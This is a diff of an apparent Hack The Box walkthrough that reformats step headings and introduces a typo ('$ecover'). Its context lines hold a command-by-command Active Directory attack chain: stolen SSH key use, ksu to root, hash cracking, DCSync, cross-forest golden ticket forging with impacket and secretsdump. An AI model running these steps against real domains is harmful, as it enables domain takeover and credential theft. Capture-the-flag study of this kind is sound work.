@@ -368,13 +368,13 @@ ssh -i /tmp/.runner_key -o StrictHostKeyChecking=no svc-runner@172.16.20.3 'id; 
 
 ## Privesc (svc-runner → root SRV01 → DC01 root)
 
-4.1 — interactive session as svc-runner
+### Interactive session as svc-runner
 
 ```bash
 ssh -i /tmp/.runner_key -o StrictHostKeyChecking=no svc-runner@172.16.20.3
 ```
 
-4.3 — recover domain credential
+### $ecover domain credential
 
 ```bash
 systemctl cat gitea-runner
@@ -447,7 +447,7 @@ KRB5CCNAME=/tmp/krb5cc_rootuser klist
 
 > Note: the `-` line between the two replace blocks in setpw.ldif is required LDIF syntax — do not remove it.
 
-**4.7 — ksu to local root**
+4.7 — ksu to local root
 
 ```bash
 which ksu; ls -la /root/.k5login /home/*/.k5login 2>&1 | head
@@ -456,7 +456,7 @@ KRB5CCNAME=/tmp/krb5cc_rootuser ksu root
 
 Prompt becomes `#`. You are root on SRV01.
 
-**4.8 — read backup**
+4.8 — read backup
 
 ```bash
 id
@@ -466,7 +466,7 @@ grep -iA5 'INSERT INTO `users`' /root/darkzero_campaigns_backup.sql | head -20
 
 ⚠ copy celia's bcrypt hash (row id 2).
 
-**4.9 — crack celia (Kali) + confirm privs (SRV01 root)**
+4.9 — crack celia (Kali) + confirm privs (SRV01 root)
 
 ```bash
 # Kali:
@@ -484,7 +484,7 @@ KRB5CCNAME=/tmp/krb5cc_gitea LDAPSASL_NOCANON=on ldapsearch -Y GSSAPI -H ldap://
   trustPartner trustDirection trustAttributes 2>&1 | grep -iE 'trustPartner|trustDirection|trustAttributes'
 ```
 
-**4.10 — tunnel (Kali T2, leave running) + DCSync krbtgt (Kali T1)**
+4.10 — tunnel (Kali T2, leave running) + DCSync krbtgt (Kali T1)
 
 ```bash
 # Kali T2 — leave open:
@@ -506,7 +506,7 @@ KRB5CCNAME=/tmp/krb5cc_gitea LDAPSASL_NOCANON=on ldapsearch -Y GSSAPI -H ldap://
 
 Decode base64 → SID; drop the trailing `-NNNN` for the domain SID.
 
-**4.11 — find crossing SID (SRV01 root)**
+4.11 — find crossing SID (SRV01 root)
 
 ```bash
 nslookup -type=SRV _ldap._tcp.dc._msdcs.darkzero.htb 172.16.20.2
@@ -525,7 +525,7 @@ KRB5CCNAME=/tmp/krb5cc_celia LDAPSASL_NOCANON=on ldapsearch -Y GSSAPI \
 
 Decode → SID ending `-1603`. ⚠ save it.
 
-**4.12 — forge ticket (Kali T1)** — ⚠ your aes key, source SID, crossing SID:
+4.12 — forge ticket (Kali T1) — ⚠ your aes key, source SID, crossing SID:
 
 ```bash
 impacket-ticketer -aesKey <KRBTGT_AES256> \
@@ -537,7 +537,7 @@ impacket-ticketer -aesKey <KRBTGT_AES256> \
 export KRB5CCNAME=$(pwd)/administrator.ccache
 ```
 
-**4.13 — plumbing (Kali T1).** hosts + krb5.conf:
+4.13 — plumbing (Kali T1). hosts + krb5.conf:
 
 ```bash
 echo "172.16.20.2 DC02.darkzero.ext darkzero.ext DARKZERO.EXT" | sudo tee -a /etc/hosts
@@ -572,7 +572,7 @@ date -u   # confirm it matches the DC, not 4-5h off
 
 After this, run impacket raw — no faketime needed. If a later command throws `KRB_AP_ERR_SKEW`, re-run `sudo date -u -s '<current DC time>'`.
 
-**4.14 — confirm SID crossed (Kali T1)**
+4.14 — confirm SID crossed (Kali T1)
 
 ```bash
 impacket-smbclient -k -no-pass DC01.darkzero.htb
@@ -587,7 +587,7 @@ exit
 
 Expect `C$ ADMIN$ NETLOGON` listed.
 
-**4.15 — export hives server-side, then fetch (Kali T1)**
+4.15 — export hives server-side, then fetch (Kali T1)
 
 ```bash
 impacket-reg -k -no-pass DC01.darkzero.htb backup -o 'C:\Windows\SYSVOL\sysvol\darkzero.htb\scripts'
@@ -617,7 +617,7 @@ impacket-secretsdump -system SYSTEM.save -security SECURITY.save LOCAL
 
 ⚠ save the `$MACHINE.ACC` NT hash.
 
-**4.16 — DCSync htb + root (Kali T1)** — ⚠ your machine hash, then admin hash:
+4.16 — DCSync htb + root (Kali T1) — ⚠ your machine hash, then admin hash:
 
 ```bash
 impacket-secretsdump 'darkzero.htb/DC01$@172.16.20.1' \
